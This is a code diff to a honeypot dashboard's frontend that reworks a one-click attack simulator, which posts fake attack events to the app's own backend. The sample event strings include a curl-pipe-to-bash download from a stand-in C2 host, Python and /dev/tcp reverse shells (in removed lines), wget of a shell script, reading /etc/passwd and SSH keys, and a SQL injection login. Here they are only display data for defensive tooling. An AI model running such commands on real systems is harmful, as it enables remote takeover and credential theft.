@@ -57,44 +57,61 @@ export const fetchMitre = (sessionId) =>
 export const fetchReport = (sessionId) => apiFetch(`/api/reports/${sessionId}`);
 
 // ─── One-Click Simulator ─────────────────────────────────────────────────────
-// Sends a realistic honeypot attack event to the live backend so the dashboard
-// fills with live data instantly — no terminal access needed.
-const SIM_SERVICES = ['ssh', 'http', 'ftp'];
+// Sends a full multi-stage attack campaign to the live backend (schema-compliant).
 const SIM_IPS = [
   '185.220.101.45', '23.129.64.101', '45.142.212.100',
-  '194.165.16.77',  '62.102.148.69', '109.70.100.23',
-  '178.175.148.217','91.108.4.40',   '198.96.155.3',
+  '194.165.16.77', '62.102.148.69', '109.70.100.23',
 ];
-const SIM_COMMANDS = [
-  'cat /etc/passwd', 'wget http://malware.xyz/shell.sh',
-  'curl -s http://c2.evil.ru/payload | bash',
-  'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'10.10.10.10\',4444));os.dup2(s.fileno(),0)"',
-  'nmap -sV 192.168.1.0/24', 'ssh-keygen -t rsa && cat /root/.ssh/id_rsa',
-  'sudo su -', '/bin/bash -i >& /dev/tcp/185.220.101.45/4444 0>&1',
-  'ls /root', 'id && whoami && hostname',
+const TARGET_IP = '10.0.0.100';
+
+const SSH_CAMPAIGN = [
+  { event_type: 'auth_attempt', event: 'Failed password for root', metadata: { username: 'root', success: false } },
+  { event_type: 'auth_attempt', event: 'Failed password for admin', metadata: { username: 'admin', success: false } },
+  { event_type: 'auth_attempt', event: 'Accepted password for root', metadata: { username: 'root', success: true } },
+  { event_type: 'command', event: 'whoami', metadata: { cwd: '/root' } },
+  { event_type: 'command', event: 'uname -a', metadata: {} },
+  { event_type: 'command', event: 'cat /etc/passwd', metadata: {} },
+  { event_type: 'decoy_access', event: 'cat /root/fake-credentials.txt', metadata: { resource: 'fake-credentials', is_decoy: true } },
+  { event_type: 'command', event: 'wget http://malware.xyz/shell.sh -O /tmp/x.sh', metadata: {} },
+  { event_type: 'command', event: 'sudo -l', metadata: {} },
 ];
-const SIM_UAS = [
-  'Mozilla/5.0 zgrab/0.x', 'curl/7.68.0', 'python-requests/2.28',
-  'masscan/1.3', 'Nikto/2.1.6', 'Go-http-client/1.1',
+
+const WEB_CAMPAIGN = [
+  { event_type: 'http_request', event: 'GET /robots.txt', metadata: { method: 'GET', path: '/robots.txt', user_agent: 'Nikto/2.1.6' } },
+  { event_type: 'http_request', event: 'GET /admin', metadata: { method: 'GET', path: '/admin', user_agent: 'curl/7.68.0' } },
+  { event_type: 'decoy_access', event: 'GET /fake-config', metadata: { resource: 'fake-config', is_decoy: true } },
+  { event_type: 'auth_attempt', event: "POST /login admin' OR '1'='1", metadata: { username: 'admin', injection: true } },
 ];
 
 function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+function evtId(sessionId, n) { return `EVT-SIM-${sessionId.slice(-8)}-${String(n).padStart(3, '0')}`; }
+
+async function postEvent(payload) {
+  return apiFetch('/api/events', { method: 'POST', body: JSON.stringify(payload) });
+}
 
 export async function runAttackSimulation() {
-  const service = pick(SIM_SERVICES);
+  const service = Math.random() > 0.5 ? 'ssh' : 'web';
   const ip = pick(SIM_IPS);
-  const sessionId = `sim-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
+  const sessionId = `ATK-SIM-${Date.now().toString(36).toUpperCase()}`;
+  const events = service === 'ssh' ? SSH_CAMPAIGN : WEB_CAMPAIGN;
+  const ts = () => new Date().toISOString();
 
-  const payload = {
-    session_id: sessionId,
-    source_ip: ip,
-    service,
-    timestamp: new Date().toISOString(),
-    event_type: service === 'ssh' ? 'LOGIN_ATTEMPT' : 'HTTP_REQUEST',
-    data: service === 'ssh'
-      ? { username: pick(['root','admin','ubuntu','pi','user']), command: pick(SIM_COMMANDS) }
-      : { method: 'GET', path: pick(['/admin','/wp-login.php','/.env','/.git/config','/phpmyadmin']), user_agent: pick(SIM_UAS) },
-  };
-
-  return apiFetch('/api/events', { method: 'POST', body: JSON.stringify(payload) });
+  let last = null;
+  for (let i = 0; i < events.length; i++) {
+    const e = events[i];
+    last = await postEvent({
+      event_id: evtId(sessionId, i + 1),
+      session_id: sessionId,
+      source_ip: ip,
+      target_ip: TARGET_IP,
+      service,
+      timestamp: ts(),
+      event_type: e.event_type,
+      event: e.event,
+      metadata: { ...e.metadata, simulation: true, campaign: 'dashboard_one_click' },
+    });
+    await new Promise(r => setTimeout(r, 350));
+  }
+  return last;
 }
